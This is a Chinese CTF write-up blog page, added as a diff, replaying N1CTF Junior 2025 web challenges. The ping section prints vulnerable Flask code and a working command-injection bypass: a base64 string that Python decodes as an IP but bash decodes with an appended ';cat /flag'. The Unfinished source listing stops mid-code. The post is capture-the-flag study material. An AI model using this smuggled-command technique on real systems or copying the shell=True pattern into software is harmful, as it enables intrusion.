@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="N1CTF Junior 2025 赛后复现记录  哎，又一次意识到自己还是太弱了（无力~，整个比赛中只做出来一道online_unzipper， 也看了ping和unfinished两道，感觉都是有点思路，但卡在一个地方上了。比如：ping感觉猜到是base64得解码差异，但没验证出来。unfinished，感觉是有点思路但是不多。。。总之打一下复现梳理一下思路也算是做一下赛后总结。 ping1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="y@7q">
+<meta property="og:url" content="http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/index.html">
+<meta property="og:site_name" content="y@7q">
+<meta property="og:description" content="N1CTF Junior 2025 赛后复现记录  哎，又一次意识到自己还是太弱了（无力~，整个比赛中只做出来一道online_unzipper， 也看了ping和unfinished两道，感觉都是有点思路，但卡在一个地方上了。比如：ping感觉猜到是base64得解码差异，但没验证出来。unfinished，感觉是有点思路但是不多。。。总之打一下复现梳理一下思路也算是做一下赛后总结。 ping1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250913204257.png">
+<meta property="article:published_time" content="2025-09-13T08:57:41.785Z">
+<meta property="article:modified_time" content="2025-10-01T15:03:00.800Z">
+<meta property="article:author" content="y@7q">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250913204257.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>y@7q</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/%E6%9D%82%E8%B0%88/%E3%80%8ASteins;Gate%E3%80%8B%E6%B8%B8%E7%8E%A9%E5%90%8E%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E9%9D%B6%E5%9C%BA/ctfshow-SSTI%E4%B8%93%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/n1/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#N1CTF-Junior-2025-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">N1CTF Junior 2025 赛后复现记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ping"><span class="toc-number">1.1.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unfinished"><span class="toc-number">1.2.</span> <span class="toc-text">Unfinished</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#online-unzipper"><span class="toc-number">1.3.</span> <span class="toc-text">online_unzipper</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">y@7q</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-13T08:57:41.785Z" class="dt-published" itemprop="datePublished">2025-09-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="N1CTF-Junior-2025-赛后复现记录"><a href="#N1CTF-Junior-2025-赛后复现记录" class="headerlink" title="N1CTF Junior 2025 赛后复现记录"></a>N1CTF Junior 2025 赛后复现记录</h1><p>  哎，又一次意识到自己还是太弱了（无力~，整个比赛中只做出来一道online_unzipper， 也看了ping和unfinished两道，感觉都是有点思路，但卡在一个地方上了。比如：ping感觉猜到是base64得解码差异，但没验证出来。unfinished，感觉是有点思路但是不多。。。<br>总之打一下复现梳理一下思路也算是做一下赛后总结。</p>
+<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(</span><br><span class="line">            command,</span><br><span class="line">            shell=<span class="literal">True</span>,</span><br><span class="line">            check=<span class="literal">True</span>,</span><br><span class="line">            capture_output=<span class="literal">True</span>,</span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> process.stdout</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ping&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    data = flask.request.json</span><br><span class="line">    ip_base64 = data.get(<span class="string">&#x27;ip_base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ip_base64:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;no ip&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    result = run_ping(ip_base64)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;output&#x27;</span>: result&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>感觉很明显可以看出命令拼接处在<code>command = f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#39;&#123;ip_base64&#125;&#39; | base64 -d)&quot; | sh&quot;&quot;&quot;</code>,但是不知道怎么绕过<code>def run_ping(ip_base64):</code>这个waf,难道不需要绕过吗？</p>
+<p>赛后看了别人wp，了解到这里是考察了python的base64解码和bash的base64解码的区别。</p>
+<p>可以看到下面这个例子，python解码的时候会直接忽略<code>=</code>之后的内容，而bash的则会按照正常解码流程，全部解码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text_1 = <span class="string">&quot;127.0.0.11&quot;</span></span><br><span class="line"></span><br><span class="line">text_2 = <span class="string">&quot;;cat /flag&quot;</span></span><br><span class="line"></span><br><span class="line">base64_1 = base64.b64encode(text_1.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64_1)</span><br><span class="line">base64_2 = base64.b64encode(text_2.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64_2)</span><br><span class="line">ip_base64 = base64_1 + base64_2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;拼接后：&quot;</span> + ip_base64)</span><br><span class="line">decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;再解码：&quot;</span> + decoded_ip)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">MTI3LjAuMC4xMQ==</span></span><br><span class="line"><span class="string">O2NhdCAvZmxhZw==</span></span><br><span class="line"><span class="string">拼接后：MTI3LjAuMC4xMQ==O2NhdCAvZmxhZw==</span></span><br><span class="line"><span class="string">再解码：127.0.0.11</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yatq@ya7q:/mnt/c/Windows/system32$ <span class="built_in">echo</span> <span class="string">&#x27;MTI3LjAuMC4xMQ==O2NhdCAvZmxhZw==&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">127.0.0.11;<span class="built_in">cat</span> /flag</span><br><span class="line">yatq@ya7q:/mnt/c/Windows/system32$</span><br></pre></td></tr></table></figure>
+
+<p>直接抓包然后传参过去就行。</p>
+<h2 id="Unfinished"><a href="#Unfinished" class="headerlink" title="Unfinished"></a>Unfinished</h2><p><strong>源码：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, flash, render_template_string, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, UserMixin, login_user, logout_user, current_user, login_required</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;your-secret-key-here&#x27;</span></span><br><span class="line"></span><br><span class="line">login_manager = LoginManager()</span><br><span class="line">login_manager.init_app(app)</span><br><span class="line">login_manager.login_view = <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">UserMixin</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">id</span>, username, password, bio=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.bio = bio</span><br><span class="line">admin_password = os.urandom(<span class="number">12</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">USERS_DB = &#123;<span class="string">&#x27;admin&#x27;</span>: User(<span class="built_in">id</span>=<span class="number">1</span>, username=<span class="string">&#x27;admin&#x27;</span>, password=admin_password)&#125;</span><br><span class="line">USER_ID_COUNTER = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> USERS_DB.values():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(user.<span class="built_in">id</span>) == user_id:</span><br><span class="line">            <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">global</span> USER_ID_COUNTER</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS_DB:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        USER_ID_COUNTER += <span class="number">1</span></span><br><span class="line">        new_user = User(</span><br><span class="line">            <span class="built_in">id</span>=USER_ID_COUNTER,</span><br><span class="line">            username=username,</span><br><span class="line">            password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        USERS_DB[username] = new_user</span><br><span class="line">        login_user(new_user)</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, <span class="string">&#x27;your_ticket_value&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        user = USERS_DB.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.password == password:</span><br><span class="line">            login_user(user)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        flash(<span class="string">&#x27;Invalid credentials.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ticket&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ticket</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        ticket = request.form[<span class="string">&#x27;ticket&#x27;</span>]</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, ticket)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;ticket.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span 